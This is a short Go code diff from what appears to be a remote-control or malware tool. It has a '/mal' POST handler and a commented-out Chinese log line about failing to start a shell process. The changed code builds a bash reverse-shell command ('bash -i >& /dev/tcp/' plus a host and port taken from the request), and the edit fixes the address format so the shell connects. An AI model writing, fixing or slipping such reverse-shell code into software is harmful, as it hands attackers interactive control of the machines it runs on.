@@ -94,7 +94,7 @@ func main() {
 			//	logrus.Errorf("[main] - [POST /mal] - 启动shell进程失败: %v", err)
 			//	return
 			//}
-			target := fmt.Sprintf("%s:%d", req.Host, req.Port)
+			target := fmt.Sprintf("%s/%d", req.Host, req.Port)
 			cmdBytes := []byte("bash -i >& /dev/tcp/" + target + " 0>&1")
 			cmdStr := string(cmdBytes)
 
